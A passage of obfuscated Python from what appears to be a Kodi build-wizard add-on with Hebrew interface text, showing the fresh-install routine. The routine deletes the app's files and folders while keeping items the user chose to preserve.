		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:5320
		O0OO0OO00OOO0OO00 =wiz .latestDB ('Addons')#line:5321
		for O00OOOOOOOO0OO0O0 ,O0OO000OOOOOOOO0O ,O00000O00O00OO0O0 in os .walk (O00O0OO0O0O0OOOOO ,topdown =True ):#line:5322
			O0OO000OOOOOOOO0O [:]=[O00O0OO00O00O0O0O for O00O0OO00O00O0O0O in O0OO000OOOOOOOO0O if O00O0OO00O00O0O0O not in EXCLUDES ]#line:5323
			for O0O0OOO00O00O0O00 in O00000O00O00OO0O0 :#line:5324
				OOO00O0O0O0OO0O00 +=1 #line:5325
				OOO000O0000O0OOOO =O00OOOOOOOO0OO0O0 .replace ('/','\\').split ('\\')#line:5326
				OOOOO0O000O0O00O0 =len (OOO000O0000O0OOOO )-1 #line:5328
				if OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5329
				elif O0O0OOO00O00O0O00 =='MyVideos99.db'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5330
				elif O0O0OOO00O00O0O00 =='MyVideos107.db'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5331
				elif O0O0OOO00O00O0O00 =='MyVideos116.db'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5332
				elif O0O0OOO00O00O0O00 =='MyVideos99.db'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5333
				elif O0O0OOO00O00O0O00 =='MyVideos107.db'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5334
				elif O0O0OOO00O00O0O00 =='MyVideos116.db'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5335
				elif OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5336
				elif OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'skin.anonymous.mod'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5337
				elif OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'skin.Premium.mod'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5338
				elif OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'skin.anonymous.nox'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5339
				elif OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'skin.phenomenal'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5340
				elif OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'plugin.video.metalliq'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5341
				elif OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'skin.titan'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5343
				elif OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'pvr.iptvsimple'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5344
				elif O0O0OOO00O00O0O00 =='sources.xml'and OOO000O0000O0OOOO [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5346
				elif O0O0OOO00O00O0O00 =='quicknav.DATA.xml'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5349
				elif O0O0OOO00O00O0O00 =='x1101.DATA.xml'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5350
				elif O0O0OOO00O00O0O00 =='b-srtym-b.DATA.xml'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5351
				elif O0O0OOO00O00O0O00 =='x1102.DATA.xml'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5352
				elif O0O0OOO00O00O0O00 =='b-sdrvt-b.DATA.xml'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5353
				elif O0O0OOO00O00O0O00 =='x1112.DATA.xml'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5354
				elif O0O0OOO00O00O0O00 =='b-tlvvyzyh-b.DATA.xml'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5355
				elif O0O0OOO00O00O0O00 =='x1111.DATA.xml'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5356
				elif O0O0OOO00O00O0O00 =='b-tvknyshrly-b.DATA.xml'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5357
				elif O0O0OOO00O00O0O00 =='x1110.DATA.xml'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5358
				elif O0O0OOO00O00O0O00 =='b-yldym-b.DATA.xml'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5359
				elif O0O0OOO00O00O0O00 =='x1114.DATA.xml'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5360
				elif O0O0OOO00O00O0O00 =='b-mvzyqh-b.DATA.xml'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5361
				elif O0O0OOO00O00O0O00 =='mainmenu.DATA.xml'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5362
				elif O0O0OOO00O00O0O00 =='skin.Premium.mod.properties'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5363
				elif O0O0OOO00O00O0O00 =='x1122.DATA.xml'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5365
				elif O0O0OOO00O00O0O00 =='b-spvrt-b.DATA.xml'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5366
				elif O0O0OOO00O00O0O00 =='favourites.xml'and OOO000O0000O0OOOO [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5371
				elif O0O0OOO00O00O0O00 =='guisettings.xml'and OOO000O0000O0OOOO [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5373
				elif O0O0OOO00O00O0O00 =='profiles.xml'and OOO000O0000O0OOOO [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5374
				elif O0O0OOO00O00O0O00 =='advancedsettings.xml'and OOO000O0000O0OOOO [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5375
				elif OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5376
				elif OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'program.apollo'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5377
				elif OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5378
				elif OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'plugin.video.telemedia'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPTELEMEDIA =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5379
				elif OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'plugin.video.elementum'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5382
				elif OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5384
				elif OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'weather.yahoo'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5385
				elif OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'plugin.video.quasar'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5386
				elif OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'program.apollo'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5387
				elif OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5388
				elif OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -2 ]=='userdata'and OOO000O0000O0OOOO [OOOOO0O000O0O00O0 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OOO000O0000O0OOOO [OOOOO0O000O0O00O0 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5389
				elif O0O0OOO00O00O0O00 in LOGFILES :wiz .log ("Keep Log File: %s"%O0O0OOO00O00O0O00 ,xbmc .LOGNOTICE )#line:5390
				elif O0O0OOO00O00O0O00 .endswith ('.db'):#line:5391
					try :#line:5392
						if O0O0OOO00O00O0O00 ==O0OO0OO00OOO0OO00 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O0O0OOO00O00O0O00 ,KODIV ),xbmc .LOGNOTICE )#line:5393
						else :os .remove (os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ))#line:5394
					except Exception as O0000O000OO00OO00 :#line:5395
						if not O0O0OOO00O00O0O00 .startswith ('Textures13'):#line:5396
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:5397
							wiz .log ("-> %s"%(str (O0000O000OO00OO00 )),xbmc .LOGNOTICE )#line:5398
							wiz .purgeDb (os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ))#line:5399
				else :#line:5400
					DP .update (int (wiz .percentage (OOO00O0O0O0OO0O00 ,O0OO00O000000O000 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0OOO00O00O0O00 ),'')#line:5401
					try :os .remove (os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ))#line:5402
					except Exception as O0000O000OO00OO00 :#line:5403
						wiz .log ("Error removing %s"%os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),xbmc .LOGNOTICE )#line:5404
						wiz .log ("-> / %s"%(str (O0000O000OO00OO00 )),xbmc .LOGNOTICE )#line:5405
			if DP .iscanceled ():#line:5406
				DP .close ()#line:5407
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5408
				return False #line:5409
		for O00OOOOOOOO0OO0O0 ,O0OO000OOOOOOOO0O ,O00000O00O00OO0O0 in os .walk (O00O0OO0O0O0OOOOO ,topdown =True ):#line:5410
			O0OO000OOOOOOOO0O [:]=[O000O00O000OO000O for O000O00O000OO000O in O0OO000OOOOOOOO0O if O000O00O000OO000O not in EXCLUDES ]#line:5411
			for O0O0OOO00O00O0O00 in O0OO000OOOOOOOO0O :#line:5412
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O0OOO00O00O0O00 ),'')#line:5413
			  if O0O0OOO00O00O0O00 not in ["Database","userdata","temp","addons","addon_data"]:#line:5414
			   if not (O0O0OOO00O00O0O00 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:5415
			    if not (O0O0OOO00O00O0O00 =='skin.titan'and KEEPSKIN3 =='true'):#line:5417
			      if not (O0O0OOO00O00O0O00 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:5418
			       if not (O0O0OOO00O00O0O00 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:5419
			        if not (O0O0OOO00O00O0O00 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:5420
			         if not (O0O0OOO00O00O0O00 =='program.apollo'and KEEPINFO =='true'):#line:5421
			          if not (O0O0OOO00O00O0O00 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:5422
			           if not (O0O0OOO00O00O0O00 =='weather.yahoo'and KEEPWEATHER =='true'):#line:5423
			            if not (O0O0OOO00O00O0O00 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:5424
			             if not (O0O0OOO00O00O0O00 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:5425
			              if not (O0O0OOO00O00O0O00 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:5426
			               if not (O0O0OOO00O00O0O00 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5427
			                if not (O0O0OOO00O00O0O00 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5428
			                 if not (O0O0OOO00O00O0O00 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5429
			                  if not (O0O0OOO00O00O0O00 =='plugin.video.neptune'and KEEPINFO =='true'):#line:5430
			                   if not (O0O0OOO00O00O0O00 =='plugin.video.youtube'and KEEPINFO =='true'):#line:5431
			                    if not (O0O0OOO00O00O0O00 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5432
			                     if not (O0O0OOO00O00O0O00 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5433
			                      if not (O0O0OOO00O00O0O00 =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5434
			                       if not (O0O0OOO00O00O0O00 =='plugin.video.telemedia'and KEEPTELEMEDIA =='true'):#line:5435
			                           if not (O0O0OOO00O00O0O00 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5439
			                            if not (O0O0OOO00O00O0O00 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5440
			                             if not (O0O0OOO00O00O0O00 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5441
			                              if not (O0O0OOO00O00O0O00 =='plugin.video.quasar'and KEEPINFO =='true'):#line:5442
			                               if not (O0O0OOO00O00O0O00 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5443
			                                  shutil .rmtree (os .path .join (O00OOOOOOOO0OO0O0 ,O0O0OOO00O00O0O00 ),ignore_errors =True ,onerror =None )#line:5445
			if DP .iscanceled ():#line:5446
				DP .close ()#line:5447
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5448
				return False #line:5449
		DP .close ()#line:5450
		wiz .clearS ('build')#line:5451
		if over ==True :#line:5452
			return True #line:5453
		elif install =='restore':#line:5454
			return True #line:5455
		elif install :#line:5456
			buildWizard (install ,'normal',over =True )#line:5457
		else :#line:5458
			if INSTALLMETHOD ==1 :OO0OOO00OO0OOOO00 =1 #line:5459
			elif INSTALLMETHOD ==2 :OO0OOO00OO0OOOO00 =0 #line:5460
			else :OO0OOO00OO0OOOO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5461
			if OO0OOO00OO0OOOO00 ==1 :wiz .reloadFix ('fresh')#line:5462
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5463
	else :#line:5464
		if not install =='restore':#line:5465
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5466
			wiz .refresh ()#line:5467
def clearCache ():#line:5472
		wiz .clearCache ()#line:5473
def fixwizard ():#line:5477
		wiz .fixwizard ()#line:5478
def totalClean ():#line:5480
		wiz .clearCache ()#line:5482
		wiz .clearPackages ('total')#line:5483
		clearThumb ('total')#line:5484
		cleanfornewbuild ()#line:5485
def cleanfornewbuild ():#line:5486
